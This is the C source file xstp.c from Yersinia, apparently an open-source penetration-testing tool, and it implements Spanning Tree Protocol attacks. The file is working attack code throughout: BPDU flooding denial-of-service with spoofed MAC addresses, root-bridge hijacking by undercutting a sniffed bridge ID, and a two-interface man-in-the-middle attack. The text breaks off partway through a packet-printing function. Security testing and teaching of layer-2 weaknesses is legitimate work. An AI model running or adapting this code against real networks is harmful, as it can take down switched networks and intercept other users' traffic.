/* xstp.c
 * Implementation and attacks for Spanning Tree Protocol (Rapid and Multi)
 *
 * Yersinia
 * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
 * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#ifndef lint
static const char rcsid[] = 
       "$Id: xstp.c 43 2007-04-27 11:07:17Z slay $";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#include <stdarg.h>

#include "xstp.h"


void
xstp_register(void)
{
   protocol_register(PROTO_STP, "STP", "Spanning Tree Protocol", "stp", 
         sizeof(struct stp_data), xstp_init_attribs, xstp_learn_packet,
         xstp_get_printable_packet, xstp_get_printable_store,
         xstp_load_values, stp_attack, 
         xstp_update_field,
         xstp_features, xstp_comm_params,  SIZE_ARRAY(xstp_comm_params), 
         NULL, 0, NULL, xstp_init_comms_struct, PROTO_VISIBLE, xstp_end);
}

/*
 * Inicializa la estructura que se usa para relacionar el tmp_data
 * de cada nodo con los datos que se sacaran por pantalla cuando
 * se accede al demonio de red.
 * Teoricamente como esta funcion solo se llama desde term_add_node()
 * la cual, a su vez, solo es llamada al tener el mutex bloqueado por
 * lo que no veo necesario que sea reentrante. (Fredy). 
 */
int8_t
xstp_init_comms_struct(struct term_node *node)
{
    struct stp_data *stp_data;
    void **comm_param;
 
    comm_param = (void *)calloc(1,sizeof(void *)*SIZE_ARRAY(xstp_comm_params));
    
    if (comm_param == NULL)
    {
       thread_error("xstp_init_commands_struct calloc error",errno);
       return -1;
    }

    stp_data = node->protocol[PROTO_STP].tmp_data;
    
    node->protocol[PROTO_STP].commands_param = comm_param;
    
    comm_param[XSTP_SMAC] = &stp_data->mac_source; 
    comm_param[XSTP_DMAC] = &stp_data->mac_dest; 
    comm_param[XSTP_ID] = &stp_data->id;
    comm_param[XSTP_VER] = &stp_data->version; 
    comm_param[XSTP_TYPE] = &stp_data->bpdu_type;
    comm_param[XSTP_FLAGS] = &stp_data->flags; 
    comm_param[XSTP_ROOTID] = &stp_data->root_id; 
    comm_param[XSTP_PATHCOST] = &stp_data->root_pc;
    comm_param[XSTP_BRIDGEID] = &stp_data->bridge_id;
    comm_param[XSTP_PORTID] = &stp_data->port_id;
    comm_param[XSTP_AGE] = &stp_data->message_age; 
    comm_param[XSTP_MAX] = &stp_data->max_age;
    comm_param[XSTP_HELLO] = &stp_data->hello_time;  
    comm_param[XSTP_FWD] = &stp_data->forward_delay;
    comm_param[14] = NULL;
    comm_param[15] = NULL;

    return 0;
}


void
xstp_th_send_bpdu_conf(void *arg)
{
    struct attacks *attacks=NULL;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("xstp_send_bpdu_conf pthread_sigmask()", errno);
       xstp_th_send_bpdu_conf_exit(attacks);    
    }

    xstp_send_all_bpdu_conf(attacks);

    xstp_th_send_bpdu_conf_exit(attacks);
}


void
xstp_th_send_bpdu_conf_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}

int8_t
xstp_send_all_bpdu_conf(struct attacks *attacks)
{
    dlist_t *p;

    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p))
    {
        if (xstp_send_bpdu_conf(attacks->mac_spoofing,
                  (struct stp_data *)(attacks->data), 
                      (struct interface_data *) dlist_data(p)) < 0)
            return -1;
    }
    
    return 0;
}


int8_t
xstp_send_bpdu_conf(u_int8_t mac_spoofing, struct stp_data *stp_data, struct interface_data *iface)
{
    libnet_ptag_t t;
    libnet_t *lhandler;
    int32_t sent;
    struct interface_data *iface_data;
    
    lhandler = iface->libnet_handler;

    t = libnet_build_stp_conf(
          stp_data->id,                /* protocol id */
          stp_data->version,           /* protocol version */
          stp_data->bpdu_type,         /* BPDU type */
          stp_data->flags,             /* BPDU flags */
          stp_data->root_id,           /* root id */
          stp_data->root_pc,           /* root path cost */
          stp_data->bridge_id,         /* bridge id */
          stp_data->port_id,           /* port id */
          stp_data->message_age,       /* message age */
          stp_data->max_age,           /* max age */
          stp_data->hello_time,        /* hello time */
          stp_data->forward_delay,     /* forward delay */
          stp_data->rstp_data,         /* payload */
          stp_data->rstp_len,          /* payload size */
          lhandler,                    /* libnet handle */
          0);                          /* libnet id */

    if (t == -1) 
    {
        thread_libnet_error( "Can't build stp header",lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }  

    t = libnet_build_802_2(
            LIBNET_SAP_STP,             /* DSAP */   
            LIBNET_SAP_STP,             /* SSAP */
            0x03,                       /* control */
            NULL,                       /* payload */  
            0,                          /* payload size */
            lhandler,                   /* libnet handle */
            0);                         /* libnet id */

    if (t == -1) 
    {
        thread_libnet_error("Can't build ethernet header",lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }  

    t = libnet_build_802_3(
            stp_data->mac_dest,                 /* ethernet destination */
            (mac_spoofing) ? stp_data->mac_source : iface->etheraddr,
            /* ethernet source */
            LIBNET_802_2_H + LIBNET_STP_CONF_H + stp_data->rstp_len, /* frame size */
            NULL,                               /* payload */
            0,                                  /* payload size */
            lhandler,                           /* libnet handle */
            0);                                 /* libnet id */

    if (t == -1)
    {
        thread_libnet_error("Can't build ethernet header",lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }

    /*
     *  Write it to the wire.
     */
    sent = libnet_write(lhandler);

    if (sent == -1) {
        thread_libnet_error("libnet_write error", lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }

    libnet_clear_packet(lhandler);
    protocols[PROTO_STP].packets_out++;

    iface_data = interfaces_get_struct(iface->ifname);
    iface_data->packets_out[PROTO_STP]++;
    
    return 0;
}



void
xstp_th_send_bpdu_tcn(void *arg)
{
    struct attacks *attacks=NULL;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("xstp_th_send_bpdu_tcn pthread_sigmask()",errno);
       xstp_th_send_bpdu_tcn_exit(attacks);    
    }

    xstp_send_all_bpdu_tcn(attacks);
    
    xstp_th_send_bpdu_tcn_exit(attacks);
}


void
xstp_th_send_bpdu_tcn_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}

int8_t
xstp_send_all_bpdu_tcn(struct attacks *attacks)
{
   dlist_t *p;

    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p))
    {
        if (xstp_send_bpdu_tcn(attacks->mac_spoofing,(struct stp_data *)(attacks->data), (struct interface_data *)dlist_data(p)) < 0)
            return -1;
    }
    return 0;
}


int8_t
xstp_send_bpdu_tcn(u_int8_t mac_spoofing, struct stp_data *stp_data, struct interface_data *iface)
{
    libnet_ptag_t t;
    int32_t sent;
    libnet_t *lhandler;
    struct interface_data *iface_data;
    
    lhandler = iface->libnet_handler;

    t = libnet_build_stp_tcn(
            stp_data->id,             /* protocol id */
            stp_data->version,        /* protocol version */
            stp_data->bpdu_type,      /* BPDU type */
            NULL,                     /* payload */
            0,                        /* payload size */
            lhandler,                 /* libnet handle */
            0);                       /* libnet id */

    if (t == -1) 
    {
        thread_libnet_error( "Can't build stp header",lhandler);
        libnet_clear_packet(lhandler);
        return -1;                
    }  

    t = libnet_build_802_2(
            LIBNET_SAP_STP,          /* DSAP */   
            LIBNET_SAP_STP,          /* SSAP */
            0x03,                    /* control */
            NULL,                    /* payload */  
            0,                       /* payload size */
            lhandler,                /* libnet handle */
            0);                      /* libnet id */
    if (t == -1) 
    {
        thread_libnet_error( "Can't build ethernet header",lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }  

    t = libnet_build_802_3(
            stp_data->mac_dest,                 /* ethernet destination */
            (mac_spoofing) ? stp_data->mac_source : iface->etheraddr,
            /* ethernet source */
            LIBNET_802_2_H + LIBNET_STP_TCN_H,  /* frame size */
            NULL,                               /* payload */
            0,                                  /* payload size */
            lhandler,                           /* libnet handle */
            0);                                 /* libnet id */

    if (t == -1)
    {
        thread_libnet_error( "Can't build ethernet header",lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }

    /*
     *  Write it to the wire.
     */
    sent = libnet_write(lhandler);

    if (sent == -1)
    {
        thread_libnet_error( "libnet_write error",lhandler);
        libnet_clear_packet(lhandler);
        return -1;
    }

    libnet_clear_packet(lhandler);
    protocols[PROTO_STP].packets_out++;
    iface_data = interfaces_get_struct(iface->ifname);
    iface_data->packets_out[PROTO_STP]++;

    return 0;
}



/*****************************/
/* Child/Thread loop sending */
/* Hellos every 'Hello Time' */
/*****************************/
void
xstp_send_hellos(void *arg)
{
    int32_t ret, i;
    u_int16_t secs;
    struct timeval hello;
    struct attacks *attacks;
    struct stp_data *stp_data;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->helper_th.finished);

    pthread_detach(pthread_self());
    
    hello.tv_sec  = 0;
    hello.tv_usec = 0;

    attacks = arg;
    stp_data = attacks->data;

    secs = 0;
    i = 0;
    
    write_log(0, "\n helper: %d started...\n", (int)pthread_self());
        
    while(!attacks->helper_th.stop)
    {
        if ( (ret=select( 0, NULL, NULL, NULL, &hello ) ) == -1 )
              break;

        if ( !ret )  /* Timeout... */
        {
           if (i%4) /* 1 sec!!...*/
           {
              i=0;
              if (secs == (ntohs(stp_data->hello_time)/256) ) /* Send Hellos...*/
              {
                 switch((u_int8_t)stp_data->bpdu_type)
                 {
                    case BPDU_CONF_STP:
                    case BPDU_CONF_RSTP:
                        xstp_send_all_bpdu_conf(arg);
                    break;

                    case BPDU_TCN:
                        xstp_send_all_bpdu_tcn(arg);
                    break;
                 }
                 secs=0;
              }
              else
                 secs++;
           }
           else
              i++;
        } /* if timeout...*/
        hello.tv_sec  = 0;
        hello.tv_usec = 250000;
    } /* while...*/

write_log(0," helper: %d finished...\n",(int)pthread_self());
    
    pthread_mutex_unlock(&attacks->helper_th.finished);
         
    pthread_exit(NULL);
}


/*********************************/
/* DoS attack sending CONF BPDUs */
/* with flag on                  */
/*********************************/
void
xstp_th_dos_conf(void *arg)
{
    struct attacks *attacks=NULL;
    struct stp_data *stp_data;
    sigset_t mask;
#ifdef LBL_ALIGN
    u_int16_t temp;
#endif

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("xstp_th_dos_conf pthread_sigmask()",errno);
       xstp_th_dos_conf_exit(attacks);    
    }

    stp_data = attacks->data;
    stp_data->flags = STP_TOPOLOGY_CHANGE;

    /* some default values for BPDUs conf */
    stp_data->root_pc       = 0;
    stp_data->hello_time    = XSTP_DFL_HELLO_TIME;
    stp_data->forward_delay = XSTP_DFL_FORW_DELAY;
    stp_data->max_age       = XSTP_DFL_MAX_AGE;
    parser_vrfy_mac("01:80:C2:00:00:00", stp_data->mac_dest);

    while(!attacks->attack_th.stop)
    {
        attack_gen_mac(stp_data->mac_source);

#ifdef LBL_ALIGN
		temp = libnet_get_prand(LIBNET_PRu16);
		memcpy((void *)stp_data->bridge_id, (void *)&temp,2);
		
		temp = libnet_get_prand(LIBNET_PRu16);
		memcpy((void *)stp_data->root_id, (void *)&temp,2);
#else
        *((u_int16_t *) (stp_data->bridge_id)) = libnet_get_prand(LIBNET_PRu16);
        *((u_int16_t *) (stp_data->root_id)) = libnet_get_prand(LIBNET_PRu16);
#endif

        memcpy((void *)&stp_data->root_id[2],(void *)&stp_data->mac_source,6);
        memcpy((void *)&stp_data->bridge_id[2],(void *)&stp_data->mac_source,6);
        xstp_send_all_bpdu_conf(attacks);
#ifdef NEED_USLEEP
        thread_usleep(100000);
#endif
    }

    xstp_th_dos_conf_exit(attacks);
}


void
xstp_th_dos_conf_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}



/********************************/
/* DoS attack sending TCN BPDUs */
/********************************/
void
xstp_th_dos_tcn(void *arg)
{
    struct attacks *attacks=NULL;
    struct stp_data *stp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("xstp_th_dos_tcn pthread_sigmask()",errno);
       xstp_th_dos_tcn_exit(attacks);        
    }

    stp_data = attacks->data;

    parser_vrfy_mac("01:80:C2:00:00:00",stp_data->mac_dest);
    stp_data->bpdu_type = BPDU_TCN;

    while(!attacks->attack_th.stop)
    {
        attack_gen_mac(stp_data->mac_source);
        xstp_send_all_bpdu_tcn(attacks);
#ifdef NEED_USLEEP
        thread_usleep(100000);
#endif
    }
    
    xstp_th_dos_tcn_exit(attacks);
}


void
xstp_th_dos_tcn_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}


/*******************************/
/* NONDoS attack sending BPDUs */
/* claiming root role if RSTP  */
/* or claiming the root bridge */
/* if not RSTP                 */
/*******************************/
void 
xstp_th_nondos_role(void *arg)
{
    struct attacks *attacks=NULL;
    struct stp_data *stp_data;
    struct pcap_pkthdr header;
    struct timeval now;
    u_int8_t flags_tmp;
    u_int8_t *packet=NULL, *stp_conf;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("xstp_th_nondos_role pthread_sigmask()",errno);
       xstp_th_nondos_role_exit(attacks);       
    }

    gettimeofday(&now,NULL);
    
    header.ts.tv_sec = now.tv_sec;
    header.ts.tv_usec = now.tv_usec;
    
    stp_data = attacks->data;

    if (xstp_learn_packet(attacks, NULL, &attacks->attack_th.stop,stp_data,&header) < 0)
        xstp_th_nondos_role_exit(attacks);
   
    xstp_decrement_bridgeid(stp_data);

    /* let the thread be created */
    thread_create(&attacks->helper_th.id, &xstp_send_hellos, attacks);

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        xstp_th_nondos_role_exit(attacks);

    while (!attacks->attack_th.stop)
    {
        interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet, PROTO_STP, NO_TIMEOUT);
        if (attacks->attack_th.stop)
           break;
           
        stp_conf = (packet + LIBNET_802_3_H + LIBNET_802_2_H);

        switch (*(stp_conf+3))
        {
            case BPDU_CONF_STP:
            case BPDU_CONF_RSTP:
                if ( *(stp_conf+3) == STP_TOPOLOGY_CHANGE) {
                    flags_tmp = stp_data->flags;
                    stp_data->flags |= STP_TOPOLOGY_CHANGE_ACK;
                    xstp_send_all_bpdu_conf(arg);
                    stp_data->flags = flags_tmp;
                }
            break;
            case BPDU_TCN:
                flags_tmp = stp_data->flags;
                stp_data->flags |= STP_TOPOLOGY_CHANGE_ACK;
                xstp_send_all_bpdu_conf(arg);
                stp_data->flags = flags_tmp;
            break;
        }
    }

    free(packet);

    xstp_th_nondos_role_exit(attacks);
}


void
xstp_th_nondos_role_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}



               
/*****************************/
/* Child/Thread loop sending */
/* Hellos every 'Hello Time' */
/*****************************/
void
xstp_send_hellos_mitm(void *arg)
{
    int32_t ret, i;
    u_int16_t secs;
    struct xstp_mitm_args *xstp_mitm_args;
    struct timeval hello;
    struct attacks *attacks;
    struct stp_data *stp_data, *stp_data2;
    struct attack_param *param = NULL;
    dlist_t *p;
    struct interface_data *iface1, *iface2;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->helper_th.finished);

    pthread_detach(pthread_self());
    
    hello.tv_sec  = 0;
    hello.tv_usec = 0;

    xstp_mitm_args = (struct xstp_mitm_args *)arg;
    
    attacks = xstp_mitm_args->attacks;
    stp_data = attacks->data;
    stp_data2 = xstp_mitm_args->stp_data2;
    
    param = attacks->params;
    p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, param[XSTP_MITM_IFACE1].value);
    iface1 = (struct interface_data *) dlist_data(p);
    p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, param[XSTP_MITM_IFACE2].value);
    iface2 = (struct interface_data *) dlist_data(p);

    secs = 0;
    i = 0;
    
    write_log(0,"\n helper: %d started...\n",(int)pthread_self());
        
    while(!attacks->helper_th.stop)
    {
        if ( (ret=select( 0, NULL, NULL, NULL, &hello ) ) == -1 )
              break;

        if ( !ret )  /* Timeout... */
        {
           if (i%4) /* 1 sec!!...*/
           {
              i=0;
              if (secs == (ntohs(stp_data->hello_time)/256) ) /* Send Hellos...*/
              {
                 switch((u_int8_t)stp_data->bpdu_type)
                 {
                    case BPDU_CONF_STP:
                    case BPDU_CONF_RSTP:
                        xstp_send_bpdu_conf(attacks->mac_spoofing,stp_data,iface1);
                        xstp_send_bpdu_conf(attacks->mac_spoofing,stp_data2,iface2);
                    break;

                    case BPDU_TCN:
                        xstp_send_bpdu_tcn(attacks->mac_spoofing,stp_data,iface1);
                        xstp_send_bpdu_tcn(attacks->mac_spoofing,stp_data2,iface2);
                    break;
                 }
                 secs=0;
              }
              else
                 secs++;
           }
           else
              i++;
        } /* if timeout...*/
        hello.tv_sec  = 0;
        hello.tv_usec = 250000;
    } /* while...*/

write_log(0," helper: %d finished...\n",(int)pthread_self());
    
    pthread_mutex_unlock(&attacks->helper_th.finished);
         
    pthread_exit(NULL);
}



/*******************************/
/* DoS attack sending BPDUs */
/* claiming root role if RSTP  */
/* or claiming the root bridge */
/* if not RSTP                 */
/*******************************/
void 
xstp_th_dos_mitm(void *arg)
{
    struct attacks *attacks=NULL;
    struct attack_param *param;
    struct xstp_mitm_args xstp_mitm_args;
    struct stp_data *stp_data, stp_data2;
    struct pcap_pkthdr header;
    struct timeval now;
    u_int8_t flags_tmp, flags_tmp2;
    u_int8_t *packet=NULL, *stp_conf;
    dlist_t *p;
    struct interface_data *iface, *iface1, *iface2;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
      thread_error("xstp_th_dos_mitm pthread_sigmask()",errno);
      xstp_th_dos_mitm_exit(attacks);       
    }

    gettimeofday(&now,NULL);
    
    header.ts.tv_sec = now.tv_sec;
    header.ts.tv_usec = now.tv_usec;

    stp_data = attacks->data;

    xstp_mitm_args.attacks = attacks;
    xstp_mitm_args.stp_data2 = &stp_data2;

    param = attacks->params;
    p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, param[XSTP_MITM_IFACE1].value);
    iface1 = (struct interface_data *) dlist_data(p);
    p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, param[XSTP_MITM_IFACE2].value);
    iface2 = (struct interface_data *) dlist_data(p);

    if (xstp_learn_packet(attacks, iface1->ifname, &attacks->attack_th.stop, stp_data, &header) < 0)
        xstp_th_dos_mitm_exit(attacks);
    xstp_decrement_bridgeid(stp_data);
   
    memcpy((void *)&stp_data2, (void *)stp_data,sizeof(struct stp_data));
    
    if (xstp_learn_packet(attacks, iface2->ifname, &attacks->attack_th.stop, &stp_data2, &header) < 0)
        xstp_th_dos_mitm_exit(attacks);
    xstp_decrement_bridgeid(&stp_data2);

    /* let the thread be created */
    thread_create(&attacks->helper_th.id, &xstp_send_hellos, &xstp_mitm_args);

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        xstp_th_dos_mitm_exit(attacks);

    while (!attacks->attack_th.stop)
    {
        iface = interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet, PROTO_STP, NO_TIMEOUT);
        if ( (iface!=iface1) && (iface!=iface2))
           continue;
           
        if (attacks->attack_th.stop)
           break;
           
        stp_conf = (packet + LIBNET_802_3_H + LIBNET_802_2_H);

        switch (*(stp_conf+3))
        {
            case BPDU_CONF_STP:
            case BPDU_CONF_RSTP:
                if ( *(stp_conf+3) == STP_TOPOLOGY_CHANGE) 
                {
                    if (iface == iface1)
                    {
                       flags_tmp = stp_data->flags;
                       stp_data->flags |= STP_TOPOLOGY_CHANGE_ACK;
                       xstp_send_bpdu_conf(attacks->mac_spoofing,stp_data,iface);
                       stp_data->flags = flags_tmp;
                    }
                    else
                    {
                       flags_tmp2 = stp_data2.flags;
                       stp_data2.flags |= STP_TOPOLOGY_CHANGE_ACK;
                       xstp_send_bpdu_conf(attacks->mac_spoofing,&stp_data2,iface);
                       stp_data2.flags = flags_tmp2;
                    }
                }
            break;
            case BPDU_TCN:
                if (iface ==  iface1)
                {
                    flags_tmp = stp_data->flags;
                    stp_data->flags |= STP_TOPOLOGY_CHANGE_ACK;
                    xstp_send_bpdu_conf(attacks->mac_spoofing,stp_data,iface);
                    stp_data->flags = flags_tmp;
                }
                else
                {
                    flags_tmp2 = stp_data2.flags;
                    stp_data2.flags |= STP_TOPOLOGY_CHANGE_ACK;
                    xstp_send_bpdu_conf(attacks->mac_spoofing,&stp_data2,iface);
                    stp_data2.flags = flags_tmp2;
                
                }
            break;
        }
    }

    free(packet);

    xstp_th_dos_mitm_exit(attacks);
}


void
xstp_th_dos_mitm_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}




/*******************************/
/* NONDoS attack sending BPDUs */
/* claiming other role         */
/*******************************/
void 
xstp_th_nondos_other_role(void *arg)
{
    struct attacks *attacks=NULL;
    struct stp_data *stp_data;
    struct pcap_pkthdr header;
    struct timeval now;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
      thread_error("xstp_th_nondos_role pthread_sigmask()",errno);
      xstp_th_nondos_other_role_exit(attacks);
   }

    stp_data = attacks->data;

    gettimeofday(&now,NULL);
    
    header.ts.tv_sec = now.tv_sec;
    header.ts.tv_usec = now.tv_sec;
    
    if (xstp_learn_packet(attacks, NULL, &attacks->attack_th.stop, stp_data,&header) < 0)
        xstp_th_nondos_other_role_exit(attacks);

    xstp_increment_bridgeid(stp_data);

    /* set a valid root pathcost */
    stp_data->root_pc = 666;

    /* let the thread be created */
    thread_create(&attacks->helper_th.id, &xstp_send_hellos, attacks);
}


void
xstp_th_nondos_other_role_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}


/* 
 * Get a packet from 'iface' interface, parse the data and copy 
 * it to the 'data' structure.
 * If iface == ALL_INTS ge a packet from any interface 
 */
int8_t
xstp_learn_packet(struct attacks *attacks, char *iface, u_int8_t *stop, void *data, struct pcap_pkthdr *header )
{
    struct stp_data *stp_data;
    struct libnet_802_3_hdr *ether;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
    u_int32_t aux_long;
#endif    
    u_int8_t *packet, *stp_conf;
    int8_t got_bpdu_conf = 0;
    dlist_t *p;
    struct interface_data *iface_data;

    stp_data = (struct stp_data *)data;
  
    if ((packet = calloc(1, SNAPLEN)) == NULL)
        return -1;

    if (iface) {
       p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, iface);
       if (!p)
          return -1;

       iface_data = (struct interface_data *) dlist_data(p);
    } else {
       iface_data = NULL;
    }

    while (!got_bpdu_conf && ! (*stop) )
    {
        interfaces_get_packet(attacks->used_ints, iface_data, stop, header, packet, PROTO_STP, NO_TIMEOUT);

        if (*stop)
        {
            free(packet);
            return -1;
        }

        stp_conf = (packet + LIBNET_802_3_H + LIBNET_802_2_H);

        switch (*(stp_conf+3))
        {
            case BPDU_CONF_STP:
            case BPDU_CONF_RSTP:

                got_bpdu_conf = 1;

                ether = (struct libnet_802_3_hdr *) (packet);

                memcpy((void *)stp_data->mac_source, (void *)ether->_802_3_shost, ETHER_ADDR_LEN);
                memcpy((void *)stp_data->mac_dest, (void *)ether->_802_3_dhost, ETHER_ADDR_LEN);

#ifdef LBL_ALIGN
               memcpy((void *)&aux_short,stp_conf,2);
               stp_data->id = ntohs(aux_short);
#else 
               stp_data->id = ntohs(*(u_int16_t *)stp_conf);
#endif

                stp_data->version = *((u_int8_t *)stp_conf+2);

                stp_data->bpdu_type = *((u_int8_t *)stp_conf+3);

                stp_data->flags = *((u_int8_t *)stp_conf+4);

                    memcpy((void *)stp_data->root_id, (void *)(stp_conf+5), 8);

                    memcpy((void *)stp_data->bridge_id, (void *)(stp_conf+17), 8);

#ifdef LBL_ALIGN
                    memcpy((void *)&aux_long,(stp_conf+13),4);
                    stp_data->root_pc = ntohl(aux_long);
#else
                    stp_data->root_pc = ntohl(*(u_int32_t *)(stp_conf+13));
#endif

#ifdef LBL_ALIGN
                    memcpy((void *)&aux_short,(stp_conf+25),2);
                    stp_data->port_id = ntohs(aux_short);
#else
                    stp_data->port_id = ntohs(*(u_int16_t *)(stp_conf+25));
#endif


#ifdef LBL_ALIGN
                    memcpy((void *)&stp_data->message_age,(stp_conf+27),2);
#else
                    stp_data->message_age = *(u_int16_t *)(stp_conf+27);
#endif

#ifdef LBL_ALIGN
                    memcpy((void *)&stp_data->max_age,(stp_conf+29),2);
#else
                    stp_data->max_age = *(u_int16_t *)(stp_conf+29);
#endif

#ifdef LBL_ALIGN
                    memcpy((void *)&stp_data->hello_time,(stp_conf+31),2);
#else
                    stp_data->hello_time = *(u_int16_t *)(stp_conf+31);
#endif

#ifdef LBL_ALIGN
                    memcpy((void *)&stp_data->forward_delay,(stp_conf+33),2);
#else
                    stp_data->forward_delay = *(u_int16_t *)(stp_conf+33);
#endif

                break;

            case BPDU_TCN:
            break;

        } /* switch */

    } /* While got */

    free(packet);

    return 0;
}



/* Decrement the bridge id to win the STP elections :) */
int8_t 
xstp_decrement_bridgeid(struct stp_data *stp_data)
{
    /* Well, we need to be the *TRUE* root id... */
    if ( stp_data->root_id[5] != 0 )
        stp_data->root_id[5]--;
    else
    {
        if ( stp_data->root_id[6] != 0 )
            stp_data->root_id[6]--;
        else
            stp_data->root_id[7]--;
    }            

    /* And we also need to be the *TRUE* bridge id... */
    if ( stp_data->bridge_id[5] != 0 )
        stp_data->bridge_id[5]--;
    else
    {
        if ( stp_data->bridge_id[6] != 0 )
            stp_data->bridge_id[6]--;
        else
            stp_data->bridge_id[7]--;
    }

    /* change our source MAC address to be equal our (sniffed) bridge id */
    memcpy((void *) stp_data->mac_source, (void *)&stp_data->bridge_id[2], 6);

    return 0;
}


int8_t 
xstp_increment_bridgeid(struct stp_data *stp_data)
{
    /* We need to be the a valid bridge id... */
    if ( stp_data->bridge_id[5] != 0 )
        stp_data->bridge_id[5]++;
    else
    {
        if ( stp_data->bridge_id[6] != 0 )
            stp_data->bridge_id[6]++;
        else
            stp_data->bridge_id[7]++;
    }

    /* change our source MAC address to be equal our (sniffed) bridge id */
    memcpy((void *) stp_data->mac_source, (void *)&stp_data->bridge_id[2], 6);

    return 0;
}


/* 
 * Return formated strings of each BPDU field
 */
char **
xstp_get_printable_packet(struct pcap_data *data)
{
    struct libnet_802_3_hdr *ether;
    u_int8_t *stp_data;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
    u_int32_t aux_long;
#endif
     char **field_values;

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_STP].nparams, protocols[PROTO_STP].parameters)) == NULL) {
        write_log(0, "Error in calloc\n");
        return NULL;
    }

    ether = (struct libnet_802_3_hdr *) data->packet;
    stp_data = (u_int8_t *) (data->packet + LIBNET_802_3_H + LIBNET_802_2_H);

    /* Source MAC */
    snprintf(field_values[XSTP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
	    ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);

